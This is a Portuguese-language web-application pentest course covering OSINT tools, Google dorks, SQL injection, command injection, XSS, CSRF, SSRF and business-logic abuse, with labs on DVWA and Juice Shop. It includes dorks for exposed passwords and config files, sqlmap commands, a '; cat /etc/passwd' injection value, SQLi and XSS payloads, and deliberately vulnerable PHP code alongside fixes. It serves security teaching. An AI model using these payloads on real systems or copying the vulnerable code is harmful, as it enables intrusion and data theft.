Shodan.io é um mecanismo de busca avançado que permite encontrar dispositivos 
conectados à internet, como câmeras, servidores, sistemas de controle industrial e IoT. 

 
 
Ele coleta e indexa informações sobre esses dispositivos, como banners de serviços, 
portas abertas e vulnerabilidades, utilizando varreduras automatizadas. A plataforma é 
amplamente utilizada por profissionais de segurança cibernética para monitorar 
exposições e identificar possíveis ameaças em redes. 
Hunter.io 
 
O Hunter.io é uma ferramenta de OSINT (Open Source Intelligence) focada na coleta de 
endereços de e-mail e informações relacionadas a domínios. Ela permite identificar 
contatos de empresas ao buscar e verificar e-mails associados a um domínio específico. 
Além disso, Hunter.io oferece a verificação da validade dos e-mails, contribuindo para a 
higienização de listas de contatos e prevenindo fraudes e phishing. 
Nmap 

 
 
 
O Nmap ou (Network Mapper) é uma ferramenta de port scanning utilizada para descobrir 
hosts e serviços em uma rede. Ele realiza varreduras identificando portas abertas, 
protocolos em uso, e informações sobre o sistema operacional e serviços associados. Sua 
flexibilidade, com opções para diferentes tipos de scans (TCP, UDP, SYN, etc.), o torna 
uma ferramenta indispensável tanto para profissionais de segurança quanto para 
administradores de sistemas. 
theHarvester 
 

 
 
O TheHarvester é uma ferramenta de OSINT usada para coletar informações sobre e-
mails, subdomínios e endereços IP a partir de fontes públicas. Utilizando diversos motores 
de busca e fontes online, como Google, Bing, e Shodan, a ferramenta é eficiente para 
identificar dados expostos que podem ser utilizados em auditorias de segurança ou 
análise de redes. 
Archive.org 
 
O archive.org é literalmente a máquina do tempo da internet, é uma ferramenta poderosa 
para qualquer pessoa interessada em explorar a história da web, realizar pesquisas ou 
simplesmente satisfazer sua curiosidade. Lembre-se de suas limitações, mas com um 
pouco de exploração, você pode abrir uma janela interessante para o mundo em constante 
mudança da internet. 
Google Dorks 

 
 
 
O Google Dorks, também conhecido como Google Hacking, é uma prática comum entre 
equipes de pentesting e investigadores. Esses “comandos de dorks” são utilizados para 
buscar informações específicas, como vulnerabilidades em sistemas, sites e até mesmo 
dados pessoais. 
Em 2004, a lista de Google Dorks foi compilada no Google Hacking Database (GHDB), 
funcionando como um extenso dicionário de consultas. Os comandos não se limitam 
apenas ao Google, podendo ser aplicados em outros mecanismos de busca, como Bing e 
Shodan, para encontrar informações confidenciais em sistemas públicos indexados. 
Descobrindo dados pessoais e de negócio 
Na imagem abaixo iremos utilizar uma dork para procurar no pastebin por e-mails 
incorretamente guardados de forma pública, execute o seguinte dork no navegador: 
site:pastebin.com intext:@gmail.com | @yahoo.com 
Como resultado será exibido endereços de e-mail de domínio gmail e yahoo guardados 
publicamente. Uma olhada com maior profundidade, pode-se encontrar e-mail e senha de 
acesso. 

 
 
 
Compartilho 10 Google Dorks que podem ser úteis no processo de reconhecimento de um 
Pentest: 
1. Buscar arquivos de configuração expostos (por exemplo, wp-config.php): 
intitle:"Index of" "wp-config.php" 
2. Procurar por páginas de login de administradores: 
intitle:"admin login" OR inurl:admin/login OR inurl:admin_area 
3. Buscar por câmeras de vigilância Panasonic ao vivo (possivelmente inseguras): 
intitle:"Live View / - AXIS" | intitle:"Live View / - Panasonic" 
4. Identificar arquivos de backup acessíveis publicamente: 
intitle:"index of" "backup" OR "database.sql" OR "backup.zip" 

 
 
5. Localizar arquivos contendo informações sensíveis (por exemplo, senhas): 
filetype:txt inurl:"passwords.txt" OR inurl:"credenciais.txt" 
6. Procurar por páginas que exibem mensagens de erro (podem revelar informações 
sensíveis): 
intext:"Warning: mysql_connect()" OR intext:"Warning: pg_connect()" 
7. Buscar por diretórios que contêm arquivos de banco de dados (.sql): 
intitle:"Index of" ".sql" 
8. Localizar arquivos robots.txt que podem listar diretórios e arquivos interessantes: 
inurl:"/robots.txt" 
9. Identificar servidores web vulneráveis com páginas de diretório expostas: 
intitle:"index of" "parent directory" OR "index of /admin" 
10. Buscar por informações sensíveis em documentos PDF: 
filetype:pdf intext:"confidencial"  
A GBHacker disponibilizou uma lista com as 1000 melhores Dorks para Pentest neste link 
https://gbhackers.com/latest-google-dorks-list/. 
Wappalyzer plugin 
O plugin Wappalyzer permite encontrar servidores web e versões de frameworks utilizados 
por uma aplicação web, estas informações são de extrema valia durante o processo de 
reconhecimento, pois pode identificar um servidor ou framework com uma vulnerabilidade 
explorável. 
O Wappalyzer está disponível no formato de plugin para o Firefox e Google Chrome. Basta 
visitar a loja de extensões do seu navegador, pesquisar pela ferramenta e incorporá-la ao 
seu navegador.  

 
 
 
FoxyProxy Plugin 
FoxyProxy é uma extensão para Firefox e Chrome que troca a conexão com a internet 
através de um ou mais servidores proxy.  
O proxy pode ser escolhido por: 
• Apontar e clicar em ícones coloridos em um menu pop-up 
• URL - define padrões de URL com curingas ou expressões regulares 
• Aba do navegador - defina proxies individuais por aba 
• Janelas de navegação privada - defina proxies diferentes para cada janela privada 
Na imagem a seguir demonstro como escolher o proxy adotado pelo navegador para 
aquela conexão. 

 
 
 
Hunter e-mail plugin 
Com o Hunter você pode encontrar imediatamente quem entrar em contato quando visitar 
um site, junto com os endereços de e-mail, você pode obter os nomes, cargos, redes 
sociais e números de telefone. Todos os dados têm fontes públicas detalhadas nos 
resultados da pesquisa.  
Estas informações em conjunto com outras podem ser utilizadas para elaborar um 
sofisticado ataque de phishing. 
 
Tamper Data plugin 

 
 
Permite interceptar e modificar dados HTTP/HTTPS em trânsito, incluindo cabeçalhos, 
cookies e parâmetros POST. Na imagem abaixo coletamos todo o cabeçalho enviado 
através de um método post no formulário de login do DVWA: 
 
O Tamper Data entrega o cabeçalho com caixas de textos que permitem alterar o 
conteúdo da request em tempo-real. 
2.3. Identificação dos inputs da aplicação 
O que são inputs? 
Inputs referem-se a qualquer dado fornecido por usuários ou sistemas externos a uma 
aplicação web. Isso inclui formulários, URLs, cabeçalhos HTTP e cookies. A forma como 
esses inputs são manipulados pode impactar significativamente a segurança da aplicação. 

 
 
Tipos de Inputs em Aplicações Web 
• Formulários de Entrada: Campos de texto, caixas de seleção, menus suspensos. 
• URLs e Parâmetros de Consulta: Dados passados na URL. 
• Cabeçalhos HTTP: Informações transmitidas no cabeçalho das solicitações. 
• Cookies: Dados armazenados no navegador do cliente. 
Impacto dos Inputs na Segurança 
Inputs não validados podem levar a diversas vulnerabilidades, como injeção de SQL, XSS 
e CSRF, permitindo a exploração por atacantes. 
Os seguintes elementos devem ser levantados: 
• Parâmetros passados no corpo de requisições POST, principalmente, campos 
escondidos, que não são visíveis pela interface da aplicação. 
• Parâmetros passados via URL em requisições GET. Considere-se que nem sempre 
os delimitadores-padrão são utilizados. 
• Cookies e os lugares em que são definidos e modificados. 
• Cabeçalhos que tendem a ser processados pela aplicação, como User-Agent, 
Referer e Host. 
• Cabeçalhos não padronizados utilizados em requisições GET e POST. 
• Canais secundários que podem ser controlados pelo usuário. Por exemplo, um 
servidor de arquivos de rede que permite submeter arquivos pelo protocolo FTP e 
visualizá-los em uma interface web. 
Metodologias para Identificação de Inputs 
Análise Estática de Código 
A análise estática envolve revisar o código fonte da aplicação para identificar pontos onde 
inputs são recebidos e processados. Isso pode revelar validações ausentes ou 
inadequadas. 
Ferramentas: SonarQube, Burp Suite, Veracode, Semgrep, OWASP Dependency Check. 
Técnicas: Revisão manual de código, busca por padrões de input. 

 
 
Neste exemplo iremos utilizar o Semgrep para uma análise estática automatizada do 
DVWA e nos informar as principais vulnerabilidades no código. Siga os passos: 
Faça o download do código-fonte do DVWA direto do repositório no GitHub. 
cd /opt 
git clone https://github.com/digininja/DVWA.git 
cd DVWA 
Execute um scan estático básico com o Segrep no diretório do projeto. 
semgrep scan --config auto 
Note que o Semgrep encontrou duas vulnerabilidades no input de dados que permitem o 
SQL Injection no código do DVWA. 
 
Inspeção de Tráfego de Rede 
A análise dinâmica envolve monitorar e inspecionar o tráfego de rede para identificar 
inputs em tempo real. Isso ajuda a entender como a aplicação lida com dados fornecidos 
pelo usuário. 
Ferramentas de Proxy (Burp Suite, OWASP ZAP) 
Neste exemplo iremos configurar o Firefox para utilizar o OWASP ZAP. 

 
 
 
Com a ferramenta em execução iremos monitorar em tempo real a navegação do usuário 
para encontrar input de dados que podem ser utilizados para exploração. 
 
Note que a aplicação capturou os dados inseridos no formulário de login do DVWA. 
Revisão de Especificações de Requisitos 
A documentação da aplicação pode fornecer insights sobre os tipos de inputs esperados 
e como eles são processados. Revisar especificações e diagramas pode ajudar a 
identificar potenciais pontos de entrada. 
Mapas de Aplicação: Representações visuais dos fluxos de dados e entradas. 
Diagramas de Fluxo de Dados: Mostrar como os dados fluem e são manipulados. 

 
 
 
No exemplo acima demonstro um exemplo de diagrama de fluxo de dados (DFD) de uma 
aplicação web de um e-commerce. No início do fluxo podemos observar que a aplicação 
tem inputs de dados que consultam por produtos no banco de dados e atualizam produtos 
no carrinho. Estas informações podem ser úteis durante um teste de aplicações, pois 
facilitam a identificação dos pontos de entrada de dados do usuário. 
Engenharia Reversa 
A Engenharia Reversa é uma atividade que trabalha com um produto existente (um 
software, uma peça mecânica, uma placa de computador, etc.) tentando entender como 
este produto funciona, o que ele faz exatamente e como ele se comporta em todas as 
circunstâncias.  
Para o contexto de aplicações em que na maior parte das vezes o pentester não têm 
acesso ao código fonte, a engenharia reversa pode ser usada para analisar binários e 
identificar entradas e como são tratadas. 
Descompiladores: JADX, JD-GUI. 

 
 
Analisadores de Binário: Ghidra, IDA Pro. 
 
No exemplo acima a aplicação não possui ofuscação ou outro mecanismo compensatório 
para proteção contra um ator malicioso. Desta forma, utilizando o aplicativo adequado 
para aquela linguagem de programação foi possível executar o processo de engenharia 
reversa e ter acesso a lista de métodos e funções da aplicação. 
Esta ação é tão perigosa que pode expor desde dados pessoais, regra de negócio, ou até 
toda a propriedade intelectual da organização contida naquele artefato. 
Injeção de SQL 
A injeção de SQL ocorre quando inputs não são devidamente validados, permitindo que 
comandos SQL maliciosos sejam executados. Identificar pontos de injeção envolve testes 
com entradas especiais.  
 
SQLmap: Automatiza o processo de teste de injeção SQL e exploração. 

 
 
 
Na imagem anterior vemos um exemplo da ferramenta em operação disferindo o ataque 
a um formulário tentando bypassar o método POST. Mas seu poder vai além, no exemplo 
a seguir vemos o SQLMap realizar injeções em header e outros métodos HTTP.  
#Inside cookie 
sqlmap  -u "http://example.com" --cookie "mycookies=*" 
  
#Inside some header 
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*" 
sqlmap -u "http://example.com" --headers="referer:*" 
  
#PUT Method 
sqlmap --method=PUT -u "http://example.com" --headers="referer:*" 
  
#The injection is located at the '*' 
Command Injection 
A injeção de comandos (Command Injection) é um ataque que visa a execução de 
comandos arbitrários numa aplicação, geralmente, o sistema operacional que hospeda a 
aplicação web. 
Os ataques de injeção de comando são possíveis quando uma aplicação, sem tratar os 
dados de entrada, executa-os como complemento de um comando preestabelecido no 
terminal do sistema operacional. 

 
 
Nesse ataque, os comandos do Sistema Operacional fornecidos pelo atacante são 
executados com os privilégios do usuário do servidor web no sistema. Esses ataques 
podem ser feitos de diversas maneiras, inclusive aproveitando-se de outras 
vulnerabilidades, como a desserialização de objetos. 
Imagine uma funcionalidade muito comum em roteadores wifi de residências, onde existe 
um formulário que faz um teste de conexão com o comando ping, um comando que usa o 
protocolo ICMP para verificar se um host está ativo na rede. 
Por usar o comando ping, sabemos que é necessário que em algum momento nossa 
entrada componha esse comando. Então, a funcionalidade captura o que foi informado no 
campo texto e concatena ao comando ping –c 3 <entrada>. O resultado dessa 
concatenação é executado no sistema operacional. Com isso, podemos substituir o IP, 
que seria informado, por um caractere especial que permite concatenar comandos no 
sistema operacional, como o ponto e vírgula (;). 
 
Uma derivação do ataque poderia ser explorada adicionando o valor 10.0.0.2; cat 
/etc/passwd ao campo, o sistema executará o ping e depois trará o arquivo /etc/passwd 
na tela. 
 

 
 
Aviso: nem sempre o ponto e vírgula (;) vai funcionar. Você pode estar trabalhando com 
bloqueios, sistemas operacionais diferentes (Windows, Linux), entre outras dificuldades e 
opções. Para saber mais sobre junção de comandos, você pode usar o 
https://hackersonlineclub.com/commandinjection-cheatsheet/ e ter diversas variações 
para realizar os seus ataques de injeção de comandos do sistema operacional. 
Cross-Site Scripting (XSS) 
O XSS também é conhecido como Cross-Site-Scripting e sempre aparece entre as 
vulnerabilidades mais exploradas na web. Trata-se de um ataque antigo e muito conhecido 
no mundo hacker. 
Há profissionais de segurança que subestimam o poder da exploração dessa 
vulnerabilidade, já que alguns navegadores contêm proteções prévias contra ela. No 
entanto, essas proteções ainda não são capazes de mitigar todas as suas variantes e 
também, ao depender do navegador utilizado, podem ser mais ou menos eficazes. 
XSS permite que scripts maliciosos sejam executados no navegador do usuário. Com o 
código a seguir é possível ter uma boa noção de como o navegador faz as suas 
interpretações com base nas tags. A questão principal do ataque XSS é a inclusão de um 
conteúdo que a princípio é texto, mas que, ao ser lido pelo navegador, será interpretado 
como código e, assim, executado. 
 
Como o XSS funciona? 
Por meio do XSS é possível manipular um site vulnerável para que ele execute um 
JavaScript malicioso. Quando o código malicioso é executado dentro do navegador da 
vítima, o invasor pode comprometer totalmente sua interação com o aplicativo. 

 
 
 
Existem 3 tipos de XSS, o refletido, stored e DOM-based. 
• XSS refletido, onde o script malicioso vem da solicitação HTTP atual. 
• XSS stored, onde o script malicioso vem do banco de dados do site. 
• XSS baseado em DOM, onde a vulnerabilidade existe no código do lado do cliente, 
em vez de código do lado do servidor. 
Cross-Site Request Forgery (CSRF) 
CSRF permite que um atacante engane um usuário autenticado para realizar ações não 
autorizadas. Identificar CSRF envolve verificar se a aplicação protege contra solicitações 
não autorizadas. 
Isso é possível por meio de JavaScript, já que ele permite que o navegador faça 
requisições a outros domínios de uma forma abstraída. Ao fazer isso, o cookie de 
autenticação do usuário é levado junto, sendo assim, qualquer site na internet pode 
executar uma ação indesejada em nome do usuário autenticado. 
Para qualquer requisição que é feita a um site, o navegador automaticamente envia os 
seus dados de cabeçalho. Um desses dados é o cookie, pois ele permite que o site tenha 
controle sobre sua autenticação. 
Abusando dessas características, um site pode solicitar que o navegador faça requisições 
a outros domínios e mesmo que não seja o usuário que diretamente tenha feito, os dados 
de cabeçalhos seriam enviados da mesma forma. A imagem a seguir demonstra de forma 
didática os passos de um ataque de CSRF. 

 
 
 
Ferramentas de Teste de CSRF: OWASP CSRF Tester, Burp Suite. 
Inclusão de Arquivos 
Inclusão de arquivos ocorre quando inputs permitem a inclusão de arquivos maliciosos. 
Identificar e explorar envolve testar upload e inclusão de arquivos com diferentes 
extensões e conteúdo. 
Ferramentas de Teste: Ferramentas de upload de arquivos e scanners de segurança. 
Server-Side Request Forgery (SSRF)  
O Server-Side Request Forgery (SSRF) é muito similar ao CSRF, no entanto o cliente não 
está envolvido, já que é o servidor propriamente dito que será induzido a fazer uma 
requisição. O SSRF é uma vulnerabilidade que pode existir em aplicações web e permite 
que um invasor induza a aplicação, no lado do servidor, a fazer solicitações HTTP, ou 
utilizando outros protocolos, para um domínio arbitrário qualquer. 
2.4. Identificação de dependências de terceiro 
Componentes de Terceiros (Supply Chain) 

 
 
A maioria das aplicações web hoje são construídas em uma combinação de código interno 
(proprietário) e externo código (bibliotecas, frameworks, etc) integrados internamente. 
Dependências externas podem vir de outra empresa, o que permite a integração sob uma 
modelo de licenciamento, ou opensources vindas da comunidade de software livre.  
O uso de tal dependências de terceiros no código da aplicação não é livre de riscos, e 
muitas vezes as dependências não são sujeitas a uma análise de segurança tão robusta 
quanto o código interno. 
 
 
Em dezembro de 2020, a SolarWinds (uma provedora de software de monitoramento de 
rede e sistema) confirmou que sua rede tinha sido invadida por um ator malicioso e um 
malware havia sido inserido em atualizações de software de sua plataforma tecnológica - 
SolarWinds Orion.  
O malware digitalizava as redes de clientes para detectar ferramentas de segurança que 
poderia evitar ou desativar, e se conectar furtivamente aos servidores de comando e 
controle do invasor.  
O malware permaneceu por meses antes da detecção inicial. 

 
 
Como mitigar ataques a cadeia de suprimentos? 
• SBOM (Software Bill of Materials) 
• Detecção de Vulnerabilidade de componentes de terceiros na esteira de 
desenvolvimento  
• SCA (Software Composition Analysis) 
• Testes recorrentes nas aplicações antes de entrarem em produção 
• Padrão de atualização de softwares  
2.6. Abuso de Lógica de Negócio 
 
O abuso de lógica de negócio refere-se à exploração de vulnerabilidades ou fraquezas 
nos processos e regras de negócio de uma aplicação web, sem necessariamente violar a 
segurança técnica (como SQL Injection ou XSS). 
Esses ataques aproveitam a maneira como as funções de negócio foram implementadas 
para realizar ações não intencionadas ou prejudiciais.  
Esse tipo de exploração é frequentemente mais difícil de detectar e mitigar, pois se baseia 
em um entendimento profundo dos processos de negócio e do fluxo lógico da aplicação. 
 
Como explorar Falhas na Lógica do Negócio? 
 
Manipulação de Preço em Carrinhos de Compras 
Descrição: Alterar os preços de itens no carrinho de compras ou durante o processo de 
checkout. 
Exemplo: Modificar os parâmetros de preço no cliente antes de enviar a solicitação de 
compra ao servidor, resultando em um desconto não autorizado. 
 
Bypass de Limites e Restrições 
Descrição: Contornar restrições impostas pela aplicação, como limites de transferência de 
fundos ou quantidade de itens por pedido. 
Exemplo: Aproveitar a falta de verificação de limites no servidor para transferir mais fundos 
do que permitido entre contas. 
 

 
 
Aproveitamento de Falhas de Lógica em Programas de Recompensas 
Descrição: Manipular as regras de um programa de recompensas ou pontos de fidelidade. 
Exemplo: Ganhar pontos de maneira injusta ao explorar lacunas no processo de atribuição 
de pontos. 
 
Exemplos Reais de Abuso de Lógica de Negócios 
 
Caso: O City Bank teve 350.000 dados de clientes vazados. 
Hackers conseguiram adquirir os dados pessoais de mais de 350 mil clientes do aplicativo 
web do Citi. Na época da violação, o Citi gerenciava mais de 21 milhões de clientes. Esta 
violação expôs pouco mais de 1% dos dados dos clientes. 
O que foi exposto? 
• 
Nomes dos clientes 
• 
Números de conta 
• 
Informações de contato 
Como esse hack foi realizado? Através de uma exploração conhecida como 
manipulação de parâmetros para aplicativos web e APIs. 
Como funciona a manipulação de parâmetros? 
Por exemplo, vamos considerar este cenário simples: 
Vamos supor que o aplicativo vulnerável tivesse esses endpoints: 
• 
GET: /customers/{account-number} //retorna informações do cliente, por exemplo, 
nome etc. 
• 
GET: /customers/{account-number}/accounts //retorna informações da conta do 
cliente, etc. 
• 
GET: /customers/{account-number}/contacts //retorna informações de contato do 
cliente, etc. 

 
 
Nota: O parâmetro {account-number} pode ser um parâmetro de caminho, como o 
exemplo acima, ou poderia ser um parâmetro de consulta ou corpo, como o exemplo 
abaixo. Esta exploração funcionará em todos os cenários. 
• 
GET: /customers?account-number=val //retorna informações do cliente, por 
exemplo, nome, etc. 
Critérios para o ataque bem-sucedido? Esta exploração funcionará se houver uma falha 
na lógica de negócios do aplicativo. Uma validação ausente ou uma atribuição de função 
ausente pode permitir que qualquer usuário no aplicativo solicite informações 
pertencentes a qualquer outro usuário/cliente apenas conhecendo os números de conta 
de outros clientes. 
O que piorou a situação? Números de conta previsíveis, como números incrementais 
100034567, 100034568, etc. Isso permitirá que um atacante automatize e roube grandes 
quantidades de números contínuos sem precisar procurar números específicos na web. 
O que não funciona para impedir esse tipo de ataque? 
• 
Não importa se esses endpoints estavam protegidos. Os atacantes geralmente 
usam credenciais roubadas para acessar esses caminhos. 
• 
Não importa se esses endpoints não foram publicados nos aplicativos web do 
cliente. Existem várias maneiras de identificar endpoints não publicados. 
• 
Testes de fuzzing não detectam essas explorações. 
• 
Scanners web também não ajudam a detectar essas explorações; eles se 
concentram mais em injeções e ataques de fuzzing do que em cenários específicos 
como esses. 
• 
A análise de código estático também não ajudará. Esses cenários exigem testes 
ao vivo. 
Como proteger a aplicação contra esses ataques? 
• 
Prática recomendada ainda na etapa de design: nunca use IDs incrementais para 
a identificação de registros no seu banco de dados. Em vez disso, use UIDs 

 
 
aleatórios. Isso retardará o ataque, tornando muito mais difícil adivinhar e capturar 
UIDs. 
• 
Continue a escanear e validar a lógica de controle de acesso em todos os 
endpoints. À medida que o produto cresce, essas vulnerabilidades se tornam 
comuns. 
• 
Use um Scanner que além de ataques de injeção, procura por vulnerabilidades de 
lógica de negócios, incluindo RBAC, ABAC, Hijack, ataques de exposição de dados 
sensíveis, etc. 
Pratique uma Falha de Lógica de Negócio no Juice Shop 
 
1. Acesse o Juice Shop no navegador, em http://localhost:3000. 
2. Navegue pela loja e adicione algum item ao carrinho. 
3. Clique no ícone do carrinho e inicie o processo de checkout. Preencha todos os 
dados solicitados. 
 
4. Volte a tela anterior. 
5. No campo de cupom, insira um código de desconto válido, por exemplo, 
k#*Agg+yKr, e aplique o cupom. Desconto válido até 31/08/24. Novos descontos 
em: https://www.reddit.com/r/owasp_juiceshop/?rdt=45575 
6. Capture essa requisição no Burp Suite. 
 

 
 
 
 
7. Envie a requisição para o módulo Repeater: Ctrl + R ou clique com o botão direito 
e vá até Send to Repeater. 
8. Volte para o navegador e observe o total da compra. 
9. Se a lógica de validação do uso do cupom é realizada apenas no cliente, o desconto 
será aplicado múltiplas vezes, resultando em um desconto acumulado maior do que 
o permitido. 
 
 

 
 
 
UNIDADE 3 – Segurança Ofensiva 
Nesta unidade exploraremos de fato uma aplicação web vulnerável. Iremos executar todos 
os principais ataques que uma aplicação está propícia se os devidos cuidados não forem 
tomados durante o desenvolvimento. Vocês terão oportunidade de testar vulnerabilidade 
de XSS, SQL Injection, CSRF, SSRF, Negação de Serviço em uma aplicação, testar falhas 
em componentes de terceiros e muito mais. 
OBJETIVOS DA UNIDADE 
Ao final dos estudos, você deverá ser capaz de: 
• Testar mecanismo de autenticação e autorização 
• Explorar XSS e vulnerabilidades de injeção 
• Explorar o SSRF 
• Realizar a Negação de Serviço (DoS) 
• Testar vulnerabilidade em bibliotecas de terceiros 
• Explorar vulnerabilidade de inclusão remota e local de arquivos 
3.1. 
Teste de mecanismos de autenticação 
Mecanismos de autenticação e autorização são os principais responsáveis por garantir 
que apenas usuários autorizados possam acessar determinadas funcionalidades e dados 
em uma aplicação web. Falhas nesses mecanismos podem permitir que atacantes 
obtenham acesso não autorizado a recursos sensíveis, comprometendo a segurança da 
aplicação. 
Vulnerabilidades Comuns 
Brute Force: Um ataque onde o atacante tenta várias combinações de senhas até 
encontrar a correta. Sem proteções adequadas, como rate limiting, esse tipo de ataque 
pode ser bem-sucedido. 

 
 
Session Fixation: Uma vulnerabilidade onde o atacante força a vítima a usar uma sessão 
pré-determinada, permitindo que o atacante assuma o controle da sessão após o login. 
Autenticação Fraca: Uso de senhas fracas, não verificação de identidade ou falta de 
autenticação multifator (MFA) tornam mais fácil para os atacantes comprometerem contas. 
Exemplo de Código Vulnerável 
Aqui está um exemplo simples de código PHP que demonstra uma autenticação 
vulnerável: 
<?php 
session_start(); 
$username = $_POST['username']; 
$password = $_POST['password']; 
  
// Conexão ao banco de dados 
$conn = new mysqli("localhost", "root", "", "testdb"); 
  
// Verificação do usuário 
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'"; 
$result = $conn->query($query); 
  
if ($result->num_rows > 0) { 
    $_SESSION['user'] = $username; 
    echo "Login bem-sucedido!"; 
} else { 
    echo "Usuário ou senha incorretos!"; 
} 
?> 
Problemas identificados: 
O uso direto dos dados fornecidos pelo usuário ($username e $password) na consulta 
SQL sem qualquer tipo de validação ou sanitização expõe o sistema a um ataque de SQL 
Injection. Um invasor pode injetar comandos SQL maliciosos, como ' OR '1'='1 para obter 
acesso ao sistema sem a necessidade de fornecer credenciais válidas. 
Correção: 

 
 
Usar consultas parametrizadas (prepared statements) ou funções de escape de dados 
para evitar SQL Injection: 
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?"); 
$stmt->bind_param("ss", $username, $password); 
$stmt->execute(); 
$result = $stmt->get_result(); 
As senhas também estão sendo armazenadas e verificadas diretamente no banco de 
dados sem nenhum tipo de hashing ou criptografia. Isso é uma falha grave, pois, em caso 
de comprometimento do banco de dados, todas as senhas dos usuários estarão expostas. 
Correção: 
Utilize uma função de hashing segura, como password_hash() para armazenar as 
senhas e password_verify() para verificar as credenciais: 
// No cadastro 
$hashedPassword = password_hash($password, PASSWORD_DEFAULT); 
  
// Na verificação 
$stmt = $conn->prepare("SELECT password FROM users WHERE username = ?"); 
$stmt->bind_param("s", $username); 
$stmt->execute(); 
$result = $stmt->get_result(); 
if ($result->num_rows > 0) { 
    $row = $result->fetch_assoc(); 
    if (password_verify($password, $row['password'])) { 
        $_SESSION['user'] = $username; 
        echo "Login bem-sucedido!"; 
    } else { 
        echo "Usuário ou senha incorretos!"; 
    } 
} 
Falta de Controle de Sessão (Autorização) 
O código simplesmente define o valor de $_SESSION['user'] como o nome de usuário 
do usuário autenticado, sem nenhum mecanismo adicional de controle de sessão. Isso 
pode permitir que um invasor manipule diretamente essa variável de sessão ou roube uma 
sessão ativa. 
Correção: 
Implemente medidas para proteger as sessões, como regeneração de IDs de sessão após 
o login bem-sucedido e validação da sessão ativa, usando tokens de sessão seguros: 

 
 
session_regenerate_id(true); // Regenera o ID da sessão para evitar roubo de sessão 
Falta de Limitação de Tentativas de Login (Autenticação) 
O código permite tentativas ilimitadas de login, o que facilita ataques de força bruta. Um 
atacante pode tentar várias combinações de nome de usuário e senha até encontrar uma 
válida. 
Correção: 
Implemente uma política de limitação de tentativas de login, como bloquear 
temporariamente a conta após várias tentativas falhas ou utilizar um sistema de 
CAPTCHA. 
Exposição de Detalhes de Erro (Autenticação) 
O código retorna a mensagem "Usuário ou senha incorretos!" diretamente ao usuário, o 
que pode permitir ataques de enumeração de usuários, ou seja, o invasor pode descobrir 
quais nomes de usuários estão registrados no sistema. 
Correção: 
Utilize uma mensagem genérica como "Credenciais inválidas!" sem indicar qual campo 
está incorreto. 
Transmissão de Credenciais Não Segura (Autenticação) 
O código não garante que as credenciais estejam sendo transmitidas de forma segura. Se 
o sistema não estiver configurado para usar HTTPS, as credenciais poderão ser 
interceptadas em texto claro por um atacante que esteja monitorando a rede. 
Correção: 
Certifique-se de que a aplicação está usando HTTPS para proteger a comunicação entre 
o cliente e o servidor. 
 
 

 
 
Teste Broken Access Control com DVWA 
O DVWA está vulnerável ao SQL Injection no login. 
1. Configure o navegador para enviar as requisições para o Burp Suite. 
2. Acesse a aba Proxy > HTTP History. 
3. Abra a página de login e efetue login no DVWA. 
4. No meu à esquerda, escolha a opção “Authorisation Bypass”. 
5. Note que na parte inferior da página você consegue identificar o usuário 
autenticado: 
 
6. Note que existe alguns nomes de usuários e a possibilidade de atualizá-los. O 
nosso objetivo será conseguir acessos de admin utilizando uma conta com 
menor privilégio. 
 
7. Abra uma janela privada anônima e autentique com o usuário Gordon. Usuário: 
gordonb – Senha: abc123. 
8. Note no menu lateral esquerdo que o usuário Gordon não possui 
acesso a algumas funcionalidades, entre elas “Authorisation 
Bypass”. 
 

 
 
9. Volte a janela que está logado com admin e pressione F5 para atualizar a página 
“Authorisation Bypass”. 
10. Volte ao Burp Suite e note que foi capturada a requisição para a página. 
 
11. Vamos pegar esse caminho e escrever na janela em que está logado o usuário 
Gordon. 
 
12. Veja que a aplicação não faz nenhuma validação para verificar que o usuário 
Gordon não poderia acessar aquele caminho e carrega os dados na janela. 
Mitigação dos Problemas 

 
 
• Validação de Sessão e Tokens: Implemente mecanismos robustos de controle de 
sessão, como cookies HttpOnly e Secure, além de tokens JWT assinados com 
chaves seguras. 
• Controle de Acesso Adequado: Sempre verifique a permissão do usuário no 
backend antes de acessar qualquer recurso. 
• Escalada de Privilégios: Use controles granulares de autorização e políticas 
baseadas em funções (RBAC). 
 
Explorando XSS e Vulnerabilidades de Injeção 
XSS e injeções são vulnerabilidades graves que permitem a um atacante executar código 
malicioso ou manipular a aplicação para roubar informações. 
Exemplo de Código Vulnerável 
Exemplo de código PHP vulnerável a XSS 
<?php 
// Código vulnerável a XSS e SQL Injection 
$conn = new mysqli("localhost", "user", "password", "database"); 
  
if (isset($_GET['username'])) { 
    $username = $_GET['username']; 
    echo "Welcome, " . $username; // XSS vulnerável 
} 
  
if (isset($_POST['search'])) { 
    $search = $_POST['search']; 
    $result = $conn->query("SELECT * FROM users WHERE name = '$search'"); // SQL Injection vulnerável 
} 
?> 
3.3. Explorando o Cross-site scripting (XSS) 
1. No menu lateral do DVWA, selecione “XSS (Reflected)”. 
2. Na página, você verá um campo de texto. Insira o seguinte código de XSS: 
<script>alert('XSS')</script> 

 
 
 
3. Veja que ao clicar em “Submit” irá explodir na tela um pop-up com a mensagem 
de alert que você escreveu 
 
4. Isso demonstra que a aplicação não realizou a sanitização dos dados de input 
e executou um script arbitrário. 
5. Agora vamos usar o Burp Suite para explorar e amplificar o ataque. 
6. Abra o Burp Suite e configure o navegador para usar o Burp como proxy. 
Certifique-se de que as configurações de interceptação estejam ativas. 
7. Volte para a página de XSS no DVWA e insira o código de script novamente, 
mas não envie ainda. 
8. No Burp, vá para a aba "Proxy" e, em seguida, "Intercept". Quando o 
formulário for submetido, o Burp interceptará a requisição. 
9. No Burp, localize a requisição e envie para o módulo Intruder. 

 
 
 
10.  
10. Certifique-se de que o SecLists esteja instalado. Ele está disponível no GitHub 
e pode ser baixado facilmente aqui https://github.com/danielmiessler/SecLists. 
11. No Burp Suite vá para a aba “Intruder”. Defina os marcadores (payload 
positions) no campo vulnerável a XSS. Basta selecionar o trecho da URL que 
está vulnerável e clicar em Add. 
 
12. Vá para a aba “Payloads” e carregue a lista de payloads XSS do SecLists que 
está disponível em /SecLists/Fuzzing/XSS/ human-friendly/ XSS-
Cheat-Sheet-PortSwigger.txt. 

 
 
 
13. Clique em “Start Attack” no Burp Intruder. O Burp enviará todos os payloads 
de XSS listados no SecLists, buscando uma maior gama de explorações 
possíveis. 
14. Verifique na aba Intruder quais payloads geraram respostas positivas, 
permitindo identificar formas mais sofisticadas de injeção XSS. 
 
Mitigação 
• Validação de Entrada: Sanitizar e validar todas as entradas de dados. 
• Content Security Policy (CSP): Implementar políticas para prevenir XSS. 
